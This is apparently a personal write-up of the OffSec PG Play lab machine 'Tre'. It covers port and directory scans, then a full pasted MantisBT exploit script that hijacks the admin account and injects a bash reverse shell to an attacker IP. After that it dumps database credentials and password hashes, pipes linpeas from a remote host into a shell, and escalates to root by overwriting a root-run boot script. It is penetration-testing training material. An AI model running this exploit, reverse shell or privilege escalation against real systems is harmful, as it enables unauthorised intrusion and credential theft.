---
title: "Tre"
kind: writeup
tags:
  - offsec-pg-play
  - status/done
  - writeup
  - linux
  - web
status: "Done"
difficulty: "Intermediate"
date: 2026-08-20
category:
  - "Linux"
  - "Web"
database: "Offsec PG Play"
area: "Offsec PG Play"
up: "[[Offsec PG Play]]"
notion-id: 3c2759b9275180089bbef8ab2a5195aa
---

# Tre

In: [[Career]] / [[Offsec PG Play]]

## Nmap Scan

```bash
# Nmap 7.99 scan initiated Thu Aug 20 05:09:08 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -p- --min-rate=1000 -oA nmap/tre 192.168.189.84
Nmap scan report for 192.168.189.84
Host is up (0.072s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 99:1a:ea:d7:d7:b3:48:80:9f:88:82:2a:14:eb:5f:0e (RSA)
|   256 f4:f6:9c:db:cf:d4:df:6a:91:0a:81:05:de:fa:8d:f8 (ECDSA)
|_  256 ed:b9:a9:d7:2d:00:f8:1b:d3:99:d6:02:e5:ad:17:9f (ED25519)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Tre
|_http-server-header: Apache/2.4.38 (Debian)
8082/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Tre
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Aug 20 05:09:44 2026 -- 1 IP address (1 host up) scanned in 35.66 seconds

```

## Fuzzing directories on port 80

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.199.84/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.199.84/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 69ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 6648ms]
cms                     [Status: 200, Size: 12540, Words: 762, Lines: 356, Duration: 96ms]
mantisbt                [Status: 200, Size: 6497, Words: 332, Lines: 117, Duration: 73ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 66ms]
system                  [Status: 401, Size: 461, Words: 42, Lines: 15, Duration: 67ms]
:: Progress: [20481/20481] :: Job [1/1] :: 584 req/sec :: Duration: [0:00:43] :: Errors: 0 :

┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.199.84/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r -c      

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.199.84/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3292ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 3292ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 4295ms]
cms                     [Status: 200, Size: 12540, Words: 762, Lines: 356, Duration: 66ms]
index.html              [Status: 200, Size: 164, Words: 8, Lines: 9, Duration: 66ms]
info.php                [Status: 200, Size: 87967, Words: 4353, Lines: 1038, Duration: 67ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 63ms]
system                  [Status: 401, Size: 461, Words: 42, Lines: 15, Duration: 64ms]
:: Progress: [4750/4750] :: Job [1/1] :: 609 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
:
```

## Fuzzing 8082

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u "http://192.168.199.84:8082/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -r -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.199.84:8082/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 164, Words: 8, Lines: 9, Duration: 69ms]
:: Progress: [4750/4750] :: Job [1/1] :: 607 req/sec :: Duration: [0:00:10] :: Errors: 0 ::

```

![[attachments/Offsec PG Play/Tre/image.png]]

![[attachments/Offsec PG Play/Tre/image 1.png]]

![[attachments/Offsec PG Play/Tre/image 2.png]]

```bash
https://www.exploit-db.com/exploits/48818
```

```bash
import requests
from urllib import quote_plus
from base64 import b64encode
from re import split

class exploit():	
	def __init__(self):
		self.s = requests.Session()
		self.headers = dict() # Initialize the headers dictionary
		self.RHOST = "192.168.199.84" # Victim IP
		self.RPORT = "80" # Victim port
		self.LHOST = "192.168.45.238" # Attacker IP
		self.LPORT = "4444" # Attacker Port
		self.verify_user_id = "1" # User id for the target account
		self.realname = "administrator" # Username to hijack
		self.passwd = "password" # New password after account hijack
		self.mantisLoc = "/mantisbt" # Location of mantis in URL
		self.ReverseShell = "echo " + b64encode("bash -i >& /dev/tcp/" + self.LHOST + "/" + self.LPORT + " 0>&1") + " | base64 -d | /bin/bash" # Reverse shell payload

		
	def reset_login(self):
		# Request # 1: Grab the account update token
		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/verify.php?id=' + self.verify_user_id + '&confirm_hash='
		r = self.s.get(url=url,headers=self.headers)
		if r.status_code == 404:
			print "ERROR: Unable to access password reset page"
			exit()
			
		account_update_token = r.text.split('name="account_update_token" value=')[1].split('"')[1]

		# Request # 2: Reset the account password
		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/account_update.php'
		data = "account_update_token=" + account_update_token + "&password=" + self.passwd + "&verify_user_id=" + self.verify_user_id + "&realname=" + self.realname + "&password_confirm=" + self.passwd
		self.headers.update({'Content-Type':'application/x-www-form-urlencoded'})
		r = self.s.post(url=url, headers=self.headers, data=data)

		if r.status_code == 200:
			print "Successfully hijacked account!"
		

	def login(self):
		data = "return=index.php&username=" + self.realname + "&password=" + self.passwd + "&secure_session=on"
		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'

		r = self.s.post(url=url,headers=self.headers,data=data)
		if "login_page.php" not in r.url:
			print "Successfully logged in!"
		
	
	def CreateConfigOption(self, option, value):
		# Get adm_config_set_token			
		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_report.php'
		r = self.s.get(url=url, headers=self.headers)

		adm_config_set_token = r.text.split('name="adm_config_set_token" value=')[1].split('"')[1]
		
		# Create config
		data = "adm_config_set_token=" + adm_config_set_token + "&user_id=0&original_user_id=0&project_id=0&original_project_id=0&config_option=" + option + "&original_config_option=&type=0&value=" + quote_plus(value) + "&action=create&config_set=Create+Configuration+Option"
		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/adm_config_set.php'
		r = self.s.post(url=url, headers=self.headers, data=data)		
	
		
	def TriggerExploit(self):
		print "Triggering reverse shell"
			
		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/workflow_graph_img.php'
		try:
			r = self.s.get(url=url,headers=self.headers, timeout=3)	
		except:
			pass	

	
	def Cleanup(self):
		# Delete the config settings that were created to send the reverse shell	
		print "Cleaning up"

		cleaned_up = False

		cleanup = requests.Session()

		CleanupHeaders = dict()
		CleanupHeaders.update({'Content-Type':'application/x-www-form-urlencoded'})

		data = "return=index.php&username=" + self.realname + "&password=" + self.passwd + "&secure_session=on"
		url = 'http://' + self.RHOST + ":" + self.RPORT + self.mantisLoc + '/login.php'
		r = cleanup.post(url=url,headers=CleanupHeaders,data=data)
		
		ConfigsToCleanup = ['dot_tool','relationship_graph_enable']
		
		for config in ConfigsToCleanup:
			# Get adm_config_delete_token
			url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php"
			r = cleanup.get(url=url, headers=self.headers)
			test = split('<!-- Repeated Info Rows -->',r.text)	
			
			# First element of the response list is garbage, delete it
			del test[0]		
				
			cleanup_dict = dict()
			for i in range(len(test)):
				if config in test[i]:
					cleanup_dict.update({'config_option':config})
					cleanup_dict.update({'adm_config_delete_token':test[i].split('name="adm_config_delete_token" value=')[1].split('"')[1]})
					cleanup_dict.update({'user_id':test[i].split('name="user_id" value=')[1].split('"')[1]})
					cleanup_dict.update({'project_id':test[i].split('name="project_id" value=')[1].split('"')[1]})		
			
			
			# Delete the config
			print "Deleting the " + config + " config."
			
			url = "http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_delete.php"
			data = "adm_config_delete_token=" + cleanup_dict['adm_config_delete_token'] + "&user_id=" + cleanup_dict['user_id'] + "&project_id=" + cleanup_dict['project_id'] + "&config_option=" + cleanup_dict['config_option'] + "&_confirmed=1"
			r = cleanup.post(url=url,headers=CleanupHeaders,data=data)
			
			#Confirm if actually cleaned up
			r = cleanup.get(url="http://" + self.RHOST + ":" + self.RPORT + self.mantisLoc + "/adm_config_report.php", headers=CleanupHeaders, verify=False)
			if config in r.text:
				cleaned_up = False
			else:
				cleaned_up = True
			
		if cleaned_up == True:
			print "Successfully cleaned up"
		else:
			print "Unable to clean up configs"
		
			
exploit = exploit()
exploit.reset_login()
exploit.login()
exploit.CreateConfigOption(option="relationship_graph_enable",value="1")
exploit.CreateConfigOption(option="dot_tool",value= exploit.ReverseShell + ';')
exploit.TriggerExploit()
exploit.Cleanup()

```

```bash
┌──(kali㉿kali)-[~/test]
└─$ nc -lvnp 4444                   
listening on [any] 4444 ...
connect to [192.168.45.238] from (UNKNOWN) [192.168.199.84] 57126
bash: cannot set terminal process group (569): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tre:/var/www/html/mantisbt$ ls

```

## Pivoting to the user

```bash
ww-data@tre:/var/www/html/mantisbt$ ls -la | grep config
-rw-r--r--  1 www-data www-data   2126 Apr  1  2017 adm_config_delete.php
-rw-r--r--  1 www-data www-data  19195 Apr  1  2017 adm_config_report.php
-rw-r--r--  1 www-data www-data   4852 Apr  1  2017 adm_config_set.php
drwxr-xr-x  2 www-data www-data   4096 May 12  2020 config
-rw-r--r--  1 www-data www-data 137779 Apr  1  2017 config_defaults_inc.php
-rw-r--r--  1 www-data www-data   2498 Apr  1  2017 javascript_config.php
-rw-r--r--  1 www-data www-data   1623 Apr  1  2017 manage_config_columns_page.php
-rw-r--r--  1 www-data www-data   1927 Apr  1  2017 manage_config_columns_reset.php
-rw-r--r--  1 www-data www-data   4632 Apr  1  2017 manage_config_columns_set.php
-rw-r--r--  1 www-data www-data  15238 Apr  1  2017 manage_config_email_page.php
-rw-r--r--  1 www-data www-data   6091 Apr  1  2017 manage_config_email_set.php
-rw-r--r--  1 www-data www-data   2820 Apr  1  2017 manage_config_revert.php
-rw-r--r--  1 www-data www-data  16764 Apr  1  2017 manage_config_work_threshold_page.php
-rw-r--r--  1 www-data www-data   7221 Apr  1  2017 manage_config_work_threshold_set.php
-rw-r--r--  1 www-data www-data   2381 Apr  1  2017 manage_config_workflow_graph_page.php
-rw-r--r--  1 www-data www-data  21864 Apr  1  2017 manage_config_workflow_page.php
-rw-r--r--  1 www-data www-data  10000 Apr  1  2017 manage_config_workflow_set.php
www-data@tre:/var/www/html/mantisbt$ cd config
www-data@tre:/var/www/html/mantisbt/config$ ls
Web.config  a.txt  config_inc.php  config_inc.php.sample  data.sql
www-data@tre:/var/www/html/mantisbt/config$ cat config_inc.php
<?php
$g_hostname               = 'localhost';
$g_db_type                = 'mysqli';
$g_database_name          = 'mantis';
$g_db_username            = 'mantissuser';
$g_db_password            = 'password@123AS';

$g_default_timezone       = 'America/New_York';

$g_crypto_master_salt     = 'uuvODlMDm11FeEgAJ5Fqo9Nmswufd5ELmgJkEuQGvGA=';
www-data@tre:/var/www/html/mantisbt/config$ mysql -u mantissuser
ERROR 1045 (28000): Access denied for user 'mantissuser'@'localhost' (using password: NO)
www-data@tre:/var/www/html/mantisbt/config$ mysql -u mantissuser -p 
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 358
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mantis             |
+--------------------+
2 rows in set (0.000 sec)

MariaDB [(none)]> use mantis
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mantis]> show tables;
+-----------------------------------+
| Tables_in_mantis                  |
+-----------------------------------+
| mantis_bug_file_table             |
| mantis_bug_history_table          |
| mantis_bug_monitor_table          |
| mantis_bug_relationship_table     |
| mantis_bug_revision_table         |
| mantis_bug_table                  |
| mantis_bug_tag_table              |
| mantis_bug_text_table             |
| mantis_bugnote_table              |
| mantis_bugnote_text_table         |
| mantis_category_table             |
| mantis_config_table               |
| mantis_custom_field_project_table |
| mantis_custom_field_string_table  |
| mantis_custom_field_table         |
| mantis_email_table                |
| mantis_filters_table              |
| mantis_news_table                 |
| mantis_plugin_table               |
| mantis_project_file_table         |
| mantis_project_hierarchy_table    |
| mantis_project_table              |
| mantis_project_user_list_table    |
| mantis_project_version_table      |
| mantis_sponsorship_table          |
| mantis_tag_table                  |
| mantis_tokens_table               |
| mantis_user_pref_table            |
| mantis_user_print_pref_table      |
| mantis_user_profile_table         |
| mantis_user_table                 |
+-----------------------------------+
31 rows in set (0.000 sec)

MariaDB [mantis]> select * from mantis_user_table;
+----+---------------+---------------+----------------------------------------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
| id | username      | realname      | email                                        | password                         | enabled | protected | access_level | login_count | lost_password_request_count | failed_login_count | cookie_string                                                    | last_visit | date_created |
+----+---------------+---------------+----------------------------------------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
|  1 | administrator | administrator | root@localhost                               | 5f4dcc3b5aa765d61d8327deb882cf99 |       1 |         0 |           90 |          39 |                           0 |                  0 | MmWf5g6dPctNVzbg3SZqbb_jfdf0WPAAmtcSkBAlVWlFemjEo49bAG9ITwk1CEN6 | 1787306907 |            1 |
|  2 | tre           | Tr3@123456A!  | tre@localhost                                | 64c4685f8da5c2225de7890c1bad0d7f |       1 |         0 |           70 |           0 |                           0 |                  0 | bp9uP3SY4tyKMFHSytb2RyecV5fPrsvGjb4sLboLkoyodEPn0NbZID9GhRURGAvf | 1589263108 |   1589263108 |
|  3 | test          |               | test@test.com                                | 4cfa72438f3cceddd8ab52d8f43060fb |       1 |         0 |           25 |           0 |                           0 |                  6 | ZftUBw52huRMBkHZa5FgWzYyitQEWDoMqv_kd8ylRoe2AASM_Tb31hWZ_Gq43rTd | 1787304334 |   1787304334 |
|  4 | root          |               | okccpz3x366a8f4z301mka4t3k9cx2lr@oastify.com | 7b4851a31dc6e5460b3ebfe135170614 |       1 |         0 |           25 |           0 |                           0 |                  0 | L1C7lmvQDHF2vp8QQivmQUyQu06WxkpeeJ9fFOi71TvlAUR5VYgM8nejZ9U5YCZX | 1787305197 |   1787305197 |
+----+---------------+---------------+----------------------------------------------+----------------------------------+---------+-----------+--------------+-------------+-----------------------------+--------------------+------------------------------------------------------------------+------------+--------------+
4 rows in set (0.000 sec)

```

## Used realname and username for SSH of user tre

```bash
┌──(kali㉿kali)-[~/test]
└─$ ssh tre@192.168.199.84                 
The authenticity of host '192.168.199.84 (192.168.199.84)' can't be established.
ED25519 key fingerprint is: SHA256:1ZfYO3DGJA+iL5+oiLgoa4kQETeZ48YhrRrPnTvJb3A
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.199.84' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
tre@192.168.199.84's password: 
Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tre@tre:~$ ls
local.txt
tre@tre:~$ cat local.txt 
86fd6a2892bc24e33977947c23f77c92

```

```text
tre@tre:~$ sudo -l
Matching Defaults entries for tre on tre:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tre may run the following commands on tre:
    (ALL) NOPASSWD: /sbin/shutdown

```

```bash
# 1. Enumerate sudo rights
sudo -l
# Output: (ALL) NOPASSWD: /sbin/shutdown

# 2. Run linpeas to find writable files owned by root
curl -sSL <linpeas-host>/linpeas.sh | sh
# or if already on target:
./linpeas.sh

# 3. Confirm the writable root-owned boot script
ls -la /usr/bin/check-system
# -rw----rw- 1 root root 135 ... check-system

# 4. Check what runs it (systemd unit / cron @reboot) to confirm it executes as root on boot
grep -r "check-system" /etc/systemd/system/ /usr/lib/systemd/system/ 2>/dev/null
cat /usr/lib/systemd/system/check-system.service 2>/dev/null

# 5. Overwrite check-system with a payload that sets the SUID bit on bash
cat /usr/bin/check-system   # note original contents first, for reference
echo 'chmod u+s /bin/bash' > /usr/bin/check-system
cat /usr/bin/check-system   # confirm write

# 6. Trigger a reboot using the NOPASSWD sudo rule (this is where /sbin/shutdown actually pays off)
sudo /sbin/shutdown -r now

# 7. Reconnect once the box is back up
ssh tre@<target-ip>

# 8. Drop into the SUID bash shell with -p to preserve privileges
/usr/bin/bash -p

# 9. Confirm root
id
whoami

# 10. Grab flags
cat /root/root.txt
cat /home/tre/local.txt
```
